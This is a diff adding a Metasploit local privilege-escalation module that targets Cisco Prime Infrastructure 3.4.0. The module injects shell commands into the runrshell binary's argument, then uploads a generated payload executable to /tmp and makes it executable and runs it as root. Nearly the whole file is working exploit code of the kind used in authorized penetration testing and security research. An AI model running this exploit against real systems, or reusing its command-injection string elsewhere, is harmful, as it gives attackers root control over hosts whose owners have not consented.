@@ -1,0 +1,69 @@
+##
+# This module requires Metasploit: https://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+class MetasploitModule < Msf::Exploit::Local
+  Rank = ExcellentRanking
+
+  include Msf::Post::File
+  include Msf::Exploit::EXE
+  include Msf::Exploit::FileDropper
+
+  def initialize(info = {})
+    super( update_info( info,
+      'Name'           => 'Cisco Prime Infrastructure Runrshell Privilege Escalation',
+      'Description'    => %q{
+        This modules exploits a vulnerability in Cisco Prime Infrastructure's runrshell binary. The
+        runrshell binary is meant to execute a shell script as root, but can be abused to inject
+        extra commands in the argument, allowing you to execute anything as root.
+      },
+      'License'        => MSF_LICENSE,
+      'Author'         =>
+        [
+          'Pedro Ribeiro <pedrib[at]gmail.com>', # First discovery
+          'sinn3r'                               # Metasploit module
+        ],
+      'Platform'       => ['linux'],
+      'Arch'           => [ARCH_X86, ARCH_X64],
+      'SessionTypes'   => ['shell', 'meterpreter'],
+      'DisclosureDate' => '2018-12-08',
+      'Privileged'     => true,
+      'References'     =>
+        [
+          ['URL', 'https://github.com/pedrib/PoC/blob/master/advisories/cisco-prime-infrastructure.txt#L56'],
+        ],
+      'Targets'        =>
+        [
+          [ 'Cisco Prime Infrastructure 3.4.0', {} ]
+        ],
+      'DefaultTarget'  => 0
+     ))
+
+    register_advanced_options [
+      OptString.new('WritableDir', [true, 'A directory where we can write the payload', '/tmp'])
+    ]
+  end
+
+  def exec_as_root(cmd)
+    command_string = "/opt/CSCOlumos/bin/runrshell '\" && #{cmd} #'"
+    vprint_status(cmd_exec(command_string))
+  end
+
+  def exploit
+    payload_name = "#{Rex::Text.rand_text_alpha(10)}.bin"
+    exe_path = Rex::FileUtils.normalize_unix_path(datastore['WritableDir'], payload_name)
+    print_status("Uploading #{exe_path}")
+    write_file(exe_path, generate_payload_exe)
+    unless file?(exe_path)
+      print_error("Failed to upload #{exe_path}")
+      return
+    end
+
+    register_file_for_cleanup(exe_path)
+    print_status('chmod the file with +x')
+    exec_as_root("/bin/chmod +x #{exe_path}")
+    print_status("Executing #{exe_path}")
+    exec_as_root(exe_path)
+  end
+end
